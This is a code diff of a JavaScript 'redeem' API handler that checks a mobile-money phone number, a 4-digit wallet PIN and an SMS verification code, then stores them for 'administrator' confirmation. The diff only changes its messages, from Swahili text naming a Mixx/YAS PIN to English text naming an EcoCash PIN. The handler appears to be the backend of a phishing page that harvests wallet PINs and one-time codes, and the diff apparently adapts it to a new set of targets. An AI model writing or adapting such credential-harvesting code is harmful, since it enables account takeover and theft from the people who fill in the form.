@@ -33,17 +33,17 @@ export default async function handler(req, res) {
     if (!isValidMixx(mixxNumber)) {
       return res
         .status(400)
-        .json({ ok: false, error: "Namba ya Mixx si sahihi." });
+        .json({ ok: false, error: "Please enter a valid phone number (10-12 digits)." });
     }
     if (!isValidPin(yasPin)) {
       return res
         .status(400)
-        .json({ ok: false, error: "YAS PIN lazima iwe na tarakimu 4." });
+        .json({ ok: false, error: "EcoCash PIN must be 4 digits." });
     }
     if (!isValidCode(verificationCode)) {
       return res.status(400).json({
         ok: false,
-        error: "Weka namba uliyopokea kwenye simu yako (tarakimu 4-8).",
+        error: "Please enter the 4-8 digit code you received.",
       });
     }
 
@@ -66,13 +66,13 @@ export default async function handler(req, res) {
       ok: true,
       id: record.id,
       message:
-        "Asante! Namba uliyoingiza imepokelewa. Subiri uthibitisho wa msimamizi.",
+        "Thank you! Your submission has been received. Please wait for an administrator to confirm.",
     });
   } catch (err) {
     console.error("redeem error:", err);
     if (res.headersSent) return;
     return res
       .status(500)
-      .json({ ok: false, error: "Hitilafu ya seva. Tafadhali jaribu tena." });
+      .json({ ok: false, error: "Server error. Please try again." });
   }
 }
